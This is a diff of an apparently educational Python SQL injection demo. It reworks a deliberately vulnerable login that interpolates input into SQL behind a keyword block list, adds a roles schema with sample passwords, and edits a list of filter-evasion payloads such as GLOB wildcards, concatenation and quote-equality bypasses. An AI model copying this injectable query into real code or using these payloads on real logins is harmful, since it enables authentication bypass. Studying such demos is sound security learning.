@@ -28,14 +28,14 @@ def validate_input(input_str: str, filter_keywords: list) -> bool:
 
 def vulnerable_login(username: str, password: str) -> list:
     """
-    A vulnerable login function with keyword filtering
+    A vulnerable login function with keyword filtering.
     """
     # Define filter keywords
     filter_keywords = [
         "or", "and", "true", "false", "union", "like", 
         "=", ">", "<", ";", "--", "/*", "*/", "admin"
     ]
-
+    
     connection = None
     
     try:
@@ -52,8 +52,14 @@ def vulnerable_login(username: str, password: str) -> list:
         connection = sqlite3.connect("vulnerable.db")
         cursor = connection.cursor()
         
-        # Direct string interpolation - still vulnerable!
-        query = f"SELECT username, role FROM users WHERE username = '{username}' AND password = '{password}'"
+        # Query to authenticate user and retrieve their roles
+        query = f"""
+            SELECT users.username, roles.name AS role
+            FROM users
+            JOIN user_roles ON users.id = user_roles.user_id
+            JOIN roles ON roles.id = user_roles.role_id
+            WHERE users.username = '{username}' AND users.password = '{password}'
+        """
         
         print(f"Executing query: {query}")
         
@@ -68,35 +74,76 @@ def vulnerable_login(username: str, password: str) -> list:
         if connection:
             connection.close()
 
+
 def create_vulnerable_database():
-    """Create a sample database for SQLi demonstration"""
     connection = sqlite3.connect("vulnerable.db")
     cursor = connection.cursor()
     
-    # Create a users table with some sample data
+    # Create users table
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS users (
             id INTEGER PRIMARY KEY,
-            username TEXT,
-            password TEXT,
-            role TEXT
+            username TEXT UNIQUE,
+            password TEXT
         )
     ''')
     
-    # Insert some sample users
-    sample_users = [
-        (1, 'alice', 'password123', 'user'),
-        (2, 'bob', 'securepass', 'user'),
-        (3, 'administrator', 'admin_secret', 'admin')
-    ]
+    # Create roles table
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS roles (
+            id INTEGER PRIMARY KEY,
+            name TEXT UNIQUE
+        )
+    ''')
     
+    # Create user_roles junction table
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS user_roles (
+            user_id INTEGER,
+            role_id INTEGER,
+            FOREIGN KEY (user_id) REFERENCES users (id),
+            FOREIGN KEY (role_id) REFERENCES roles (id),
+            PRIMARY KEY (user_id, role_id)
+        )
+    ''')
+    
+    # Insert sample users
+    sample_users = [
+        (1, 'alice', 'password123'),
+        (2, 'bob', 'securepass'),
+        (3, 'administrator', 'admin_secret')
+    ]
     cursor.executemany('''
-        INSERT OR REPLACE INTO users (id, username, password, role) 
-        VALUES (?, ?, ?, ?)
+        INSERT OR REPLACE INTO users (id, username, password) 
+        VALUES (?, ?, ?)
     ''', sample_users)
+    
+    # Insert sample roles
+    sample_roles = [
+        (1, 'user'),
+        (2, 'admin'),
+        (3, 'moderator')
+    ]
+    cursor.executemany('''
+        INSERT OR REPLACE INTO roles (id, name) 
+        VALUES (?, ?)
+    ''', sample_roles)
+    
+    # Assign roles to users
+    sample_user_roles = [
+        (1, 1), 
+        (2, 1),  
+        (3, 2),  
+        (3, 3)   
+    ]
+    cursor.executemany('''
+        INSERT OR REPLACE INTO user_roles (user_id, role_id) 
+        VALUES (?, ?)
+    ''', sample_user_roles)
     
     connection.commit()
     connection.close()
+
 
 def demonstrate_sqli():
     """Demonstrate SQL injection techniques with keyword filtering"""
@@ -109,10 +156,10 @@ def demonstrate_sqli():
     injection_attempts = [
         # THIS CAN'T WORK BECAUSE OF THE FILTER KEYWORDS
         # 1. Classic Authentication Bypass
-        {"username": "admin'--", "password": "anything"},
+        #{"username": "admin'--", "password": "anything"},
         
         # 2. Complex Bypass using OR
-        {"username": "admin' OR '1'='1", "password": "anything' OR '1'='1"},
+        #{"username": "admin' OR '1'='1", "password": "anything' OR '1'='1"},
 
         # 3. Bypassing 'admin' filter
         {"username": "adm1n", "password": "anything"},
@@ -120,16 +167,12 @@ def demonstrate_sqli():
         # 4. Alternative concatenation
         {"username": "administrator", "password": "'||''"},
         
-        # 5. Payload with modified keywords
-        {"username": "alice'x0r1=1", "password": "pass'x0r2=2"},
-        
-        # 6. Unicode or alternative representation tricks
-        {"username": "admin\u200b", "password": "password"},
-        
         # 7. Attempting to break filter with unusual characters
         {"username": "a' GLOB '*", "password": "a' GLOB '*"}, # Só esta é que passa
 
         {"username": "adm'||'in", "password": "' glob '*"},
+
+        {"username": "alice'='alice", "password": "alice"}
     ]
     
     print("Attempting Injections:\n")
